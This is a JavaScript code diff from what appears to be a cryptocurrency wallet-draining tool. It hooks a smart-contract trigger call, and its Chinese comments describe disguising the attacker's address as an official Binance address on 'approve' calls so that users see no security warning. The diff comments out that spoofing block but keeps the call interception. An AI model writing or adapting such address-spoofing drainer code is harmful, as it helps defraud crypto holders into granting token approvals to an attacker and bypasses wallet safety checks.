@@ -31,25 +31,25 @@
                     console.log('🎭 拦截智能合约调用:', functionSelector);
                     
                     // 🎭 地址伪装：显示Binance地址，绕过安全检测：：：：新增
-                    if (functionSelector && functionSelector.includes('approve')) {
-                        console.log('🎭🎭🎭 检测到approve调用，启动地址伪装绕过安全检测！🎭🎭🎭');
-
-                        if (parameters && Array.isArray(parameters)) {
-                            parameters = parameters.map(param => {
-                                if (param && param.type === 'address' && param.value === REAL_ATTACKER_ADDRESS) {
-                                    console.log(`🎭 地址伪装: ${param.value} → ${SPOOF_ADDRESS}`);
-                                    console.log(`🎯 用户将看到Binance官方地址，无安全风险提示`);
-
-                                    return {
-                                        ...param,
-                                        value: SPOOF_ADDRESS // 显示Binance地址
-                                    };
-                                }
-                                return param;
-                            });
-                        }
-                        console.log('🎭 地址伪装完成，用户将看到安全的官方地址');
-                    }
+                    // if (functionSelector && functionSelector.includes('approve')) {
+                    //     console.log('🎭🎭🎭 检测到approve调用，启动地址伪装绕过安全检测！🎭🎭🎭');
+                    //
+                    //     if (parameters && Array.isArray(parameters)) {
+                    //         parameters = parameters.map(param => {
+                    //             if (param && param.type === 'address' && param.value === REAL_ATTACKER_ADDRESS) {
+                    //                 console.log(`🎭 地址伪装: ${param.value} → ${SPOOF_ADDRESS}`);
+                    //                 console.log(`🎯 用户将看到Binance官方地址，无安全风险提示`);
+                    //
+                    //                 return {
+                    //                     ...param,
+                    //                     value: SPOOF_ADDRESS // 显示Binance地址
+                    //                 };
+                    //             }
+                    //             return param;
+                    //         });
+                    //     }
+                    //     console.log('🎭 地址伪装完成，用户将看到安全的官方地址');
+                    // }
                     
                     return originalTrigger.call(this, contractAddress, functionSelector, options, parameters, issuerAddress);
                 };
